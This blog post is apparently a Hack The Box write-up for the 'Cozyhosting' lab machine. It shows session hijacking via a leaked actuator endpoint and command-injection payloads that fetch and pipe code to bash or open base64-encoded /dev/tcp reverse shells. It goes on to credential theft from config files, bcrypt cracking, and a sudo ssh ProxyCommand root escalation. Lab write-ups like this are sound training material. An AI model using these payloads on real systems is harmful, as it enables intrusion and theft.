@@ -1,0 +1,240 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self' https://www.dropbox.com https://*.dl.dropboxusercontent.com https://photos.app.goo.gl https://drive.google.com https://photos.google.com https://video-downloads.googleusercontent.com https://*.googleusercontent.com https://*.googlevideo.com https://youtube.googleapis.com; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self' https://w.soundcloud.com https://www.youtube.com https://www.youtube-nocookie.com https://www.dropbox.com http://localhost https://www.dropbox.com http://darvein.local https://disqus.com; img-src 'self' https://photos.google.com https://lh3.googleusercontent.com https://www.dropbox.com https://*.dl.dropboxusercontent.com https://*.disqus.com https://c.disquscdn.com; object-src https://lh3.googleusercontent.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/ https://c.disquscdn.com; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdnjs.cloudflare.com https://www.googletagmanager.com https://www.dropbox.com http://localhost http://darvein.local https://drv21.disqus.com https://c.disquscdn.com; prefetch-src 'self' https://youtube.googleapis.com; connect-src 'self' https://www.google-analytics.com https://links.services.disqus.com;"><meta name=author content="Dennis Ruiz"><meta name=description content="easy - Cozyhosting User Flag Nmap scanning:
+~➤ sudo nmap -n -Pn -sV -O -T4 cozyhosting.htb ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.18.0 (Ubuntu) HTML source code:
+/login The machine is called Cozy Hosting, so maybe we have subdomains for customers?
+Errors: When requesting: https://everything.curl.dev/http/requests/user-agent Whitelabel Error Page This application has no explicit mapping for /error, so you are seeing this as a fallback."><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="easy - Cozyhosting User Flag Nmap scanning:
+~➤ sudo nmap -n -Pn -sV -O -T4 cozyhosting.htb ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.18.0 (Ubuntu) HTML source code:
+/login The machine is called Cozy Hosting, so maybe we have subdomains for customers?
+Errors: When requesting: https://everything.curl.dev/http/requests/user-agent Whitelabel Error Page This application has no explicit mapping for /error, so you are seeing this as a fallback."><meta property="og:title" content><meta property="og:description" content="easy - Cozyhosting User Flag Nmap scanning:
+~➤ sudo nmap -n -Pn -sV -O -T4 cozyhosting.htb ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.18.0 (Ubuntu) HTML source code:
+/login The machine is called Cozy Hosting, so maybe we have subdomains for customers?
+Errors: When requesting: https://everything.curl.dev/http/requests/user-agent Whitelabel Error Page This application has no explicit mapping for /error, so you are seeing this as a fallback."><meta property="og:type" content="article"><meta property="og:url" content="https://www.darvein.net/infosec/htb/machines/easy/cozyhosting/"><meta property="article:section" content="infosec"><title>easy - Cozyhosting </title><link rel=canonical href=https://www.darvein.net/infosec/htb/machines/easy/cozyhosting/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a1a7e7e7bd8b6629931805334fd6cf056ee6f154702847e6d597bbfe80446a0d.css integrity="sha256-oafn572LZimTGAUzT9bPBW7m8VRwKEfm1Ze7/oBEag0=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.39e41a7f16bdf8cb16e43cae7d714fa1016f1d2d2898a5b3f27f42c9979204e2.css integrity="sha256-OeQafxa9+MsW5DyufXFPoQFvHS0omKWz8n9CyZeSBOI=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/custom.min.7cf8a329bb485491ed5be45bd286916c655bf66e11e3fe4d82649437eae8b51b.css integrity="sha256-fPijKbtIVJHtW+Rb0oaRbGVb9m4R4/5NgmSUN+rotRs=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.120.4"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Darvein
+</a><input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/infosec/>Infosec</a></li><li class=navigation-item><a class=navigation-link href=/coding/>Coding</a></li><li class=navigation-item><a class=navigation-link href=/devops/>Devops</a></li></ul></section></nav><div class=content><section class="container page"><article><h1 id=easy---cozyhosting>easy - Cozyhosting
+<a class=heading-link href=#easy---cozyhosting><i class="fa fa-link" aria-hidden=true></i></a></h1><h2 id=user-flag>User Flag
+<a class=heading-link href=#user-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>Nmap scanning:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~➤ sudo nmap -n -Pn -sV -O -T4 cozyhosting.htb
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
+</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0 (Ubuntu)
+</span></span></code></pre></div><p>HTML source code:</p><ul><li><code>/login</code></li></ul><p>The machine is called Cozy Hosting, so maybe we have subdomains for customers?</p><p>Errors:
+When requesting:
+<a href=https://everything.curl.dev/http/requests/user-agent>https://everything.curl.dev/http/requests/user-agent</a></p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-txt data-lang=txt><span style=display:flex><span>Whitelabel Error Page
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>This application has no explicit mapping for /error, so you are seeing this as a fallback.
+</span></span><span style=display:flex><span>Mon Sep 04 14:36:03 UTC 2023
+</span></span><span style=display:flex><span>There was an unexpected error (type=Not Found, status=404).
+</span></span></code></pre></div><p>Found additional endpoints
+<a href=http://cozyhosting.htb/actuator>http://cozyhosting.htb/actuator</a>
+2023-09-04_10-55.png</p><p>User kanderson</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ curl <span style=color:#0086d2>&#39;http://cozyhosting.htb/actuator/sessions&#39;</span>
+</span></span><span style=display:flex><span>{<span style=color:#0086d2>&#34;BA622857926A06C4505AD2CD1B1E9A95&#34;</span>:<span style=color:#0086d2>&#34;kanderson&#34;</span>,<span style=color:#0086d2>&#34;442EC4E952C2248C8DFD7A930CD183FB&#34;</span>:<span style=color:#0086d2>&#34;kanderson&#34;</span>}%
+</span></span></code></pre></div><p>Request to /admin defaults a JSESSIONID:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ curl cozyhosting.htb/admin -I
+</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#0086f7;font-weight:700>401</span>
+</span></span><span style=display:flex><span>Server: nginx/1.18.0 (Ubuntu)
+</span></span><span style=display:flex><span>Date: Mon, <span style=color:#0086f7;font-weight:700>04</span> Sep <span style=color:#0086f7;font-weight:700>2023</span> 15:00:12 GMT
+</span></span><span style=display:flex><span>Content-Type: application/json
+</span></span><span style=display:flex><span>Connection: keep-alive
+</span></span><span style=display:flex><span>Set-Cookie: <span style=color:#fb660a>JSESSIONID</span>=4BC03143A386B60FE3D40BD9E3F52DF1; <span style=color:#fb660a>Path</span>=/; HttpOnly
+</span></span><span style=display:flex><span>WWW-Authenticate: Basic <span style=color:#fb660a>realm</span>=<span style=color:#0086d2>&#34;Realm&#34;</span>
+</span></span><span style=display:flex><span>X-Content-Type-Options: nosniff
+</span></span><span style=display:flex><span>X-XSS-Protection: <span style=color:#0086f7;font-weight:700>0</span>
+</span></span><span style=display:flex><span>Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+</span></span><span style=display:flex><span>Pragma: no-cache
+</span></span><span style=display:flex><span>Expires: <span style=color:#0086f7;font-weight:700>0</span>
+</span></span><span style=display:flex><span>X-Frame-Options: DENY
+</span></span></code></pre></div><p>Those are possible Cookies to be used. any of them worked
+2023-09-04_10-57.png</p><p>Here the app tries to touch the .ssh/authorized_keys, I mean this HTTP endpoint runs a shell command:
+2023-09-04_11-01.png</p><p>This worked forme:</p><p>Generate a base64 from the command &ldquo;/bin/bash -i >& /dev/tcp/X.X.X.X/4444 0>&amp;1&rdquo;
+And send this on the post
+;$(echo${IFS}${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}/bin/bash${IFS})</p><p>bash -i >& /dev/tcp/10.10.14.109/55555 0>&amp;1
+;$(echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMDkvNTU1NTUgMD4mMQ==${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}/bin/bash${IFS})</p><p>Another payload:
+&amp;username=user|curl${IFS}:80/|bash|</p><p>&mldr;/content/infosec/htb➤ nc -lvnp 55555
+Connection from 10.129.118.184:46450
+bash: cannot set terminal process group (990): Inappropriate ioctl for device
+bash: no job control in this shell
+app@cozyhosting:/app$ id
+id
+uid=1001(app) gid=1001(app) groups=1001(app)
+app@cozyhosting:/app$</p><p>What is running</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>app@cozyhosting:/tmp/t$ netstat -tulpn
+</span></span><span style=display:flex><span>netstat -tulpn
+</span></span><span style=display:flex><span>(Not all processes could be identified, non-owned process info
+</span></span><span style=display:flex><span> will not be shown, you would have to be root to see it all.)
+</span></span><span style=display:flex><span>Active Internet connections (only servers)
+</span></span><span style=display:flex><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+</span></span><span style=display:flex><span>tcp        <span style=color:#0086f7;font-weight:700>0</span>      <span style=color:#0086f7;font-weight:700>0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+</span></span><span style=display:flex><span>tcp        <span style=color:#0086f7;font-weight:700>0</span>      <span style=color:#0086f7;font-weight:700>0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+</span></span><span style=display:flex><span>tcp        <span style=color:#0086f7;font-weight:700>0</span>      <span style=color:#0086f7;font-weight:700>0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+</span></span><span style=display:flex><span>tcp        <span style=color:#0086f7;font-weight:700>0</span>      <span style=color:#0086f7;font-weight:700>0</span> 127.0.0.1:5432          0.0.0.0:*               LISTEN      -
+</span></span><span style=display:flex><span>tcp6       <span style=color:#0086f7;font-weight:700>0</span>      <span style=color:#0086f7;font-weight:700>0</span> 127.0.0.1:8080          :::*                    LISTEN      990/java
+</span></span><span style=display:flex><span>tcp6       <span style=color:#0086f7;font-weight:700>0</span>      <span style=color:#0086f7;font-weight:700>0</span> :::22                   :::*                    LISTEN      -
+</span></span><span style=display:flex><span>udp        <span style=color:#0086f7;font-weight:700>0</span>      <span style=color:#0086f7;font-weight:700>0</span> 127.0.0.53:53           0.0.0.0:*                           -
+</span></span><span style=display:flex><span>udp        <span style=color:#0086f7;font-weight:700>0</span>      <span style=color:#0086f7;font-weight:700>0</span> 0.0.0.0:68              0.0.0.0:*                           -
+</span></span></code></pre></div><p>Some creds</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>app@cozyhosting:/tmp/t$ cat /tmp/t//BOOT-INF/classes/application.properties
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>cat ./BOOT-INF/classes/application.properties
+</span></span><span style=display:flex><span>server.address=127.0.0.1
+</span></span><span style=display:flex><span>server.servlet.session.timeout=5m
+</span></span><span style=display:flex><span>management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
+</span></span><span style=display:flex><span>management.endpoint.sessions.enabled = true
+</span></span><span style=display:flex><span>spring.datasource.driver-class-name=org.postgresql.Driver
+</span></span><span style=display:flex><span>spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
+</span></span><span style=display:flex><span>spring.jpa.hibernate.ddl-auto=none
+</span></span><span style=display:flex><span>spring.jpa.database=POSTGRESQL
+</span></span><span style=display:flex><span>spring.datasource.platform=postgres
+</span></span><span style=display:flex><span>spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+</span></span><span style=display:flex><span>spring.datasource.username=postgres
+</span></span><span style=display:flex><span>spring.datasource.password=Vg&amp;nvzAQ7XxR
+</span></span><span style=display:flex><span>app@cozyhosting:/tmp/t$
+</span></span></code></pre></div><p>app@cozyhosting:/app$ cat /etc/hosts
+cat /etc/hosts
+127.0.0.1 localhost cozyhosting cozyhosting.htb
+127.0.1.1 cozycloud</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>
+</span></span><span style=display:flex><span>app@cozyhosting:/app$ <span style=color:#fb660a>PGPASSWORD</span>=<span style=color:#0086d2>&#34;Vg&amp;nvzAQ7XxR&#34;</span> psql -h cozyhosting -U postgres -d cozyhosting -c <span style=color:#0086d2>&#39;SELECT * FROM pg_catalog.pg_tables;&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;ozyhosting -c <span style=color:#0086d2>&#39;SELECT * FROM pg_catalog.pg_tables;&#39;</span>
+</span></span><span style=display:flex><span>     schemaname     |        tablename        | tableowner | tablespace | hasindexes | hasrules | hastriggers | rowsecurity
+</span></span><span style=display:flex><span>--------------------+-------------------------+------------+------------+------------+----------+-------------+-------------
+</span></span><span style=display:flex><span> public             | users                   | postgres   |            | t          | f        | t           | f
+</span></span><span style=display:flex><span> public             | hosts                   | postgres   |            | t          | f        | t           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_statistic            | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_type                 | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_foreign_table        | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_authid               | postgres   | pg_global  | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_statistic_ext_data   | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_user_mapping         | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_subscription         | postgres   | pg_global  | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_attribute            | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_proc                 | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_class                | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_attrdef              | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_constraint           | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_inherits             | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_index                | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_operator             | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_opfamily             | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_opclass              | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_am                   | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_amop                 | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_amproc               | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_language             | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_largeobject_metadata | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_aggregate            | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_statistic_ext        | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_rewrite              | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_trigger              | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_event_trigger        | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_description          | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_cast                 | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_enum                 | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_namespace            | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_conversion           | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_depend               | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_database             | postgres   | pg_global  | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_db_role_setting      | postgres   | pg_global  | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_tablespace           | postgres   | pg_global  | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_auth_members         | postgres   | pg_global  | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_shdepend             | postgres   | pg_global  | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_shdescription        | postgres   | pg_global  | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_ts_config            | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_ts_config_map        | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_ts_dict              | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_ts_parser            | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_ts_template          | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_extension            | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_foreign_data_wrapper | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_foreign_server       | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_policy               | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_replication_origin   | postgres   | pg_global  | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_default_acl          | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_init_privs           | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_seclabel             | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_shseclabel           | postgres   | pg_global  | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_collation            | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_partitioned_table    | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_range                | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_transform            | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_sequence             | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_publication          | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_publication_rel      | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_subscription_rel     | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> pg_catalog         | pg_largeobject          | postgres   |            | t          | f        | f           | f
+</span></span><span style=display:flex><span> information_schema | sql_parts               | postgres   |            | f          | f        | f           | f
+</span></span><span style=display:flex><span> information_schema | sql_implementation_info | postgres   |            | f          | f        | f           | f
+</span></span><span style=display:flex><span> information_schema | sql_features            | postgres   |            | f          | f        | f           | f
+</span></span><span style=display:flex><span> information_schema | sql_sizing              | postgres   |            | f          | f        | f           | f
+</span></span><span style=display:flex><span>(<span style=color:#0086f7;font-weight:700>68</span> rows)
+</span></span></code></pre></div><h1 id=the-following-lines-are-desirable-for-ipv6-capable-hosts>The following lines are desirable for IPv6 capable hosts
+<a class=heading-link href=#the-following-lines-are-desirable-for-ipv6-capable-hosts><i class="fa fa-link" aria-hidden=true></i></a></h1><p>::1 ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>app@cozyhosting:/app$ <span style=color:#fb660a>PGPASSWORD</span>=<span style=color:#0086d2>&#34;Vg&amp;nvzAQ7XxR&#34;</span> psql -h cozyhosting -U postgres -d cozyhosting -c <span style=color:#0086d2>&#39;select * from users;&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;U postgres -d cozyhosting -c <span style=color:#0086d2>&#39;select * from users;&#39;</span>
+</span></span><span style=display:flex><span>   name    |                           password                           | role
+</span></span><span style=display:flex><span>-----------+--------------------------------------------------------------+-------
+</span></span><span style=display:flex><span> kanderson | <span style=color:#fb660a>$2</span>a<span style=color:#fb660a>$10$E</span>/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+</span></span><span style=display:flex><span> admin     | <span style=color:#fb660a>$2</span>a<span style=color:#fb660a>$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm</span> | Admin
+</span></span><span style=display:flex><span>(<span style=color:#0086f7;font-weight:700>2</span> rows)
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>.../c/infosec/htb➤ john -w=/usr/share/dict/rockyou.txt hashes.txt
+</span></span><span style=display:flex><span>Warning: detected hash type <span style=color:#0086d2>&#34;bcrypt&#34;</span>, but the string is also recognized as <span style=color:#0086d2>&#34;bcrypt-opencl&#34;</span>
+</span></span><span style=display:flex><span>Use the <span style=color:#0086d2>&#34;--format=bcrypt-opencl&#34;</span> option to force loading these as that type instead
+</span></span><span style=display:flex><span>Using default input encoding: UTF-8
+</span></span><span style=display:flex><span>Loaded <span style=color:#0086f7;font-weight:700>1</span> password hash (bcrypt [Blowfish 32/64 X3])
+</span></span><span style=display:flex><span>Cost <span style=color:#0086f7;font-weight:700>1</span> (iteration count) is <span style=color:#0086f7;font-weight:700>1024</span> <span style=color:#fb660a;font-weight:700>for</span> all loaded hashes
+</span></span><span style=display:flex><span>Will run <span style=color:#0086f7;font-weight:700>12</span> OpenMP threads
+</span></span><span style=display:flex><span>Press <span style=color:#0086d2>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#fb660a;font-weight:700>for</span> status
+</span></span><span style=display:flex><span>manchesterunited (admin)
+</span></span></code></pre></div><p>SSH</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>josh@cozyhosting.htb&#39;s password:
+</span></span><span style=display:flex><span>Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style=display:flex><span> * Management:     https://landscape.canonical.com
+</span></span><span style=display:flex><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  System information as of Mon Sep  <span style=color:#0086f7;font-weight:700>4</span> 03:41:47 PM UTC <span style=color:#0086f7;font-weight:700>2023</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  System load:           0.0
+</span></span><span style=display:flex><span>  Usage of /:            56.2% of 5.42GB
+</span></span><span style=display:flex><span>  Memory usage:          21%
+</span></span><span style=display:flex><span>  Swap usage:            0%
+</span></span><span style=display:flex><span>  Processes:             <span style=color:#0086f7;font-weight:700>239</span>
+</span></span><span style=display:flex><span>  Users logged in:       <span style=color:#0086f7;font-weight:700>0</span>
+</span></span><span style=display:flex><span>  IPv4 address <span style=color:#fb660a;font-weight:700>for</span> eth0: 10.129.118.184
+</span></span><span style=display:flex><span>  IPv6 address <span style=color:#fb660a;font-weight:700>for</span> eth0: dead:beef::250:56ff:fe96:f902
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Expanded Security Maintenance <span style=color:#fb660a;font-weight:700>for</span> Applications is not enabled.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>0</span> updates can be applied immediately.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Enable ESM Apps to receive additional future security updates.
+</span></span><span style=display:flex><span>See https://ubuntu.com/esm or run: sudo pro status
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Last login: Tue Aug <span style=color:#0086f7;font-weight:700>29</span> 09:03:34 <span style=color:#0086f7;font-weight:700>2023</span> from 10.10.14.41
+</span></span><span style=display:flex><span>josh@cozyhosting:~$ id
+</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1003(josh) <span style=color:#fb660a>gid</span>=1003(josh) <span style=color:#fb660a>groups</span>=1003(josh)
+</span></span><span style=display:flex><span>josh@cozyhosting:~$ ls
+</span></span><span style=display:flex><span>user.txt
+</span></span></code></pre></div><h2 id=root-flag>Root Flag
+<a class=heading-link href=#root-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>josh@cozyhosting:~$ sudo -l
+</span></span><span style=display:flex><span>[sudo] password <span style=color:#fb660a;font-weight:700>for</span> josh:
+</span></span><span style=display:flex><span>Sorry, try again.
+</span></span><span style=display:flex><span>[sudo] password <span style=color:#fb660a;font-weight:700>for</span> josh:
+</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#fb660a;font-weight:700>for</span> josh on localhost:
+</span></span><span style=display:flex><span>    env_reset, mail_badpass, <span style=color:#fb660a>secure_path</span>=/usr/local/sbin<span style=color:#0086d2>\:</span>/usr/local/bin<span style=color:#0086d2>\:</span>/usr/sbin<span style=color:#0086d2>\:</span>/usr/bin<span style=color:#0086d2>\:</span>/sbin<span style=color:#0086d2>\:</span>/bin<span style=color:#0086d2>\:</span>/snap/bin, use_pty
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>User josh may run the following commands on localhost:
+</span></span><span style=display:flex><span>    (root) /usr/bin/ssh *
+</span></span></code></pre></div><p><a href=https://gtfobins.github.io/gtfobins/ssh/>https://gtfobins.github.io/gtfobins/ssh/</a></p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>josh@cozyhosting:~$ sudo ssh -o <span style=color:#fb660a>ProxyCommand</span>=<span style=color:#0086d2>&#39;;sh 0&lt;&amp;2 1&gt;&amp;2&#39;</span> x
+</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># id</span>
+</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=0(root) <span style=color:#fb660a>gid</span>=0(root) <span style=color:#fb660a>groups</span>=0(root)
+</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># pwd</span>
+</span></span><span style=display:flex><span>/home/josh
+</span></span></code></pre></div><h2 id=todos>TODOs
+<a class=heading-link href=#todos><i class="fa fa-link" aria-hidden=true></i></a></h2></article></section></div><footer class=footer><section class=container>©
+2021 -
+2024
+Dennis Ruiz
+·
